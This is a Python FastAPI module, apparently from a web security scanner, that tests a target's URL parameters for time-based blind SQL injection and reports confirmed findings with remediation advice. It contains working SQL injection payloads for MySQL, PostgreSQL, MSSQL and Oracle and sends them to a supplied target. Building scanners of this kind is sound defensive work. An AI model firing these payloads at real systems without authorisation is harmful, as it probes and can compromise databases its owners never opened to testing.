"""Time-based blind SQL injection — triple-confirmation zero-FP."""
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from fastapi import APIRouter, Depends
from tools._shared import (ScanRequest, verify_scan_quota, web_url,
                            safe_get, wrap_finding, standard_response)
from tools._payloads.sqli import SQL_PAYLOADS
from tools._spa_state import load_spa_state
router = APIRouter()
# Filter the 200-payload library to time-based variants (compatible with our timing detector).
# Format: (name, template, dbms) — same tuple shape the rest of the scanner expects.
_PAYLOADS = [
    (f"{p['dbms'].lower()}_{p.get('category','time')}_{i}", p['payload'], p['dbms'])
    for i, p in enumerate(SQL_PAYLOADS)
    if p.get("category") == "time" and "{N}" in p.get("payload", "")
][:40]  # cap at 40 per scan for politeness

# Fallback hardcoded baseline (used only if library load failed somehow)
if not _PAYLOADS:
    _PAYLOADS = [
        ("mysql_int",  "1 AND SLEEP({N})",                                "MySQL"),
        ("mysql_str",  "1' AND SLEEP({N})-- -",                           "MySQL"),
        ("pgsql_int",  "1 AND pg_sleep({N})",                             "PostgreSQL"),
        ("pgsql_str",  "1' AND pg_sleep({N})-- -",                        "PostgreSQL"),
        ("mssql_str",  "1'; WAITFOR DELAY '0:0:{N}'-- -",                 "MSSQL"),
        ("oracle_str", "1' AND dbms_pipe.receive_message(('a'),{N})-- -", "Oracle"),
    ]

def _time_get(url, req, timeout):
    t0 = time.time()
    r = safe_get(url, req=req, allow_redirects=True, timeout=timeout)
    return r, time.time() - t0

@router.post("/api/scan/sqli")
async def scan_sqli(req: ScanRequest, payload=Depends(verify_scan_quota)):
    base = web_url(req.target)
    parsed = urlparse(base)
    params_base = parse_qs(parsed.query)

    # Build the test set: any URL with query params is worth probing.
    # Source: base URL + SPA-discovered URLs that carry ?param= segments.
    test_urls = []
    if params_base:
        test_urls.append((base, params_base))
    spa = load_spa_state(req.target)
    for u in spa.get("urls", []):
        try:
            up = urlparse(u)
            ps = parse_qs(up.query)
            if ps:
                test_urls.append((u, ps))
        except Exception:
            continue
    if not test_urls:
        return standard_response(tool="sqli", target=req.target, findings=[],
            tests_performed=1, vulnerable=False,
            skipped_reason=("No URL parameters present on base or SPA-discovered "
                          "endpoints — append ?id=1 to test, or run the SPA Crawler "
                          "first to discover dynamic endpoints."))

    findings, tests, confirmed = [], 0, []
    _, t0 = _time_get(base, req, timeout=20)
    for test_url, params in test_urls[:8]:
        url_parsed = urlparse(test_url)
        for key in list(params.keys())[:3]:
            for name, tmpl, db in _PAYLOADS:
                tests += 1
                payload5 = tmpl.replace("{N}", "5")
                new_params = {k: v[0] for k, v in params.items()}
                new_params[key] = payload5
                probe_url = urlunparse(url_parsed._replace(query=urlencode(new_params)))
                _, t1 = _time_get(probe_url, req, timeout=25)
                if t1 < t0 + 4: continue
                payload2 = tmpl.replace("{N}", "2")
                new_params[key] = payload2
                probe_url2 = urlunparse(url_parsed._replace(query=urlencode(new_params)))
                _, t2 = _time_get(probe_url2, req, timeout=15)
                if t2 > t0 + 1 and t1 > t2:
                    findings.append(wrap_finding(
                        f"Time-based blind SQLi in {key!r} ({db}) at {test_url}",
                        "CRITICAL", cvss="9.8", cwe="CWE-89", owasp="A03:2021",
                        remediation="Use parameterised queries (prepared statements). Never concatenate user input into SQL.",
                        evidence_marker=f"url={test_url} param={key} SLEEP(5)={t1:.2f}s, SLEEP(2)={t2:.2f}s, baseline={t0:.2f}s"))
                    confirmed.append({"url": test_url, "param": key, "db": db,
                                       "t0": t0, "t1": t1, "t2": t2})
                    break
    return standard_response(tool="sqli", target=req.target, findings=findings,
        tests_performed=max(tests, 1),
        tests_summary=f"Time-based SQLi: {tests} payloads, triple-confirmation via SLEEP(5)+SLEEP(2)",
        raw_data={"sqli": {"confirmed": confirmed, "baseline_seconds": t0}})
def register(app): app.include_router(router)
